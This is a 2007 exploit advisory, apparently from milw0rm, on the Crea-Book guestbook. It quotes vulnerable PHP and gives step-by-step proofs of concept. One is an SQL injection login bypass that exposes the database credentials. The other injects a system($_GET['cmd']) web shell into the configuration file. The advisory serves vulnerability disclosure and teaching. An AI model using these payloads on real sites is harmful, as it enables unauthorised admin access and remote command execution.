@@ -1,0 +1,127 @@
+	/=======================================\
+	| Advisory :: Crea-Book <= 1.0		|
+	+=======================================+---------------------------------------------------------------\
+	|													|
+	|      Download link : http://www.comscripts.com/scripts/php.creabook.1359.html				|
+	|               Type : Guestbook									|
+	|        Vuln. found : Admin Access Bypass, DB information Disclosure & Code Execution Weakness	|
+	| 	  Conditions : magic_quotes_gpc = Off								|
+	|	  Risk level : High										|
+	|													|
+	+-------------------------------------------------------------------------------------------------------+
+	|													|
+	| Program audited by : Xst3nZ <xst3nz@gmail.com> [fr/en]						|
+	|               Date : 2007-04-10									|
+	|	 Last update : 2007-04-10									|
+	|													|
+	+-------------------------------------------------------------------------------------------------------+
+	| 	     Summary : 	0] Description									|
+	|			1] Vuln#1 : Administrative Access Bypass using basic SQL injection		|
+	|			2] Vuln#2 : PHP Code Execution Weakness						|
+	|			3] Links & Documentation							|
+	\-------------------------------------------------------------------------------------------------------/
+
+
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+ <0> DESCRIPTION
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+  This script is old but analysing it is a good way to understand some classic security holes in web
+applications. It's just a good and fast training.
+Let's g0 ...
+
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+ <1> VULNERABILITY #1 : ADMINISTRATIVE ACCESS BYPASS USING BASIC SQL INJECTION
+
+  { Concerned file : admin/admin.php }
+  { Cond: magic_quotes_gpc=Off }
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+  If we open the file 'admin/admin.php', we can see that the following code is executed after the submission of
+the login authentification form :
+
++--------8<--------
+| // [...] line 8
+| $sql="Select * from $table2 where pseudo='$pseudo' and passe='$passe'";
+| // By the way, we can notice that the script works only if register_globals=On
+| $res=mysql_query($sql);
+| $nb=mysql_num_rows($res);
+| if ($nb>0)
+| {
+| 	// Login OK [...]
+| }
+| else
+| 	header("Location: index.php?erreur=2");
+| // line 208 (EOF)
++--------8<--------
+
+In fact, the variables called $pseudo and $passe aren't sanitized and so, it is possible to bypass easily the
+authentification by using a basic SQL injection (see [1]). Nevertheless, single quotes must be used in this injection.
+Therefore, the magic_quote_gpc parameter must be disabled (Off) in the php.ini configuration file.
+
+  +---->> Vuln. #1 Pro0f of Concept <<--------
+  |
+  | - Go to : http://www.victim.com/[install_directory]/admin/admin.php
+  | - Type the following string in the two fields :
+  |  	| Pseudo (login) : evil
+  |	| Mot de passe (password) : 1' OR '1'='1
+  | - If magic_quotes_gpc=Off, you are now logged as admin. So, you have access to the control panel.
+  | - Let's go to the section called 'Configurer le script' (configure the script). In this page, you can see
+  | all the different informations required to connect to the MySQL server (DataBase Information Disclosure)
+  |
+  +-------------------------------------------//
+
+
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+ <2> VULNERABILITY #2 : PHP CODE EXECUTION WEAKNESS
+
+  { Concerned file : admin/configurer2.php }
+  { Cond: magic_quotes_gpc=Off, admin access OK }
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+  The file 'admin/configurer2.php', which is used when the configuration form is submitted, contains the following
+code :
+
++--------8<--------
+| // [...] line 95
+| $fichier = fopen("../config.inc.php3","w+") OR die ("...");;
+| fwrite($fichier, "<?php\n") or die ("...");
+| fwrite($fichier, "// Infos de connexion Ã  la base de donnÃ©es\n\n$");
+| fwrite($fichier, "bddserver = \"$bddserver\";\n$");
+| // [...]
+| fwrite($fichier, "mess_fin = \"$mess_fin\";\n");
+| fwrite($fichier, "?>");
+| fclose($fichier);
+| // line 125
++--------8<--------
+
+So, all the information which are typed in the form are written in a PHP file called 'config.inc.php3' without
+any verification before. Consequently, a malicious person which have an admin access (easy with the vuln #1) can put
+what she wants in the file in question (only if magic_quotes_gpc=Off because double quotes are used). Let's 
+see an example in the next PoC :
+
+  +---->> Vuln. #2 Pro0f of Concept <<--------
+  |
+  | - Log in as admin on 'admin/admin.php' (see Vuln. #1 PoC).
+  | - Go to 'admin/configurer.php'.
+  | - Type the following string in one of the fields : value"; [Malicious PHP code]; $nothing="
+  | Example with the fields 'Fond de la page' (background color) : #FFFFFF"; system($_GET['cmd']); $nothing="
+  |         that gives : $fond = "#FFFFFF"; system($_GET['cmd']); $nothing="";
+  |
+  +-------------------------------------------//
+
+Note : the file 'install/index.php' isn't deleted after the installation and it contains the same configuration
+form. But, database information (login, password, DB name, server name) are required to write data into the PHP file...
+
+
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+ <3> LINKS & DOCUMENTATION
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+ [1] SQL injection Attacks by Example (good)
+	http://www.unixwiz.net/techtips/sql-injection.html
+
+
+// [EOF] Xst3nZ
+
+# milw0rm.com [2007-04-10]
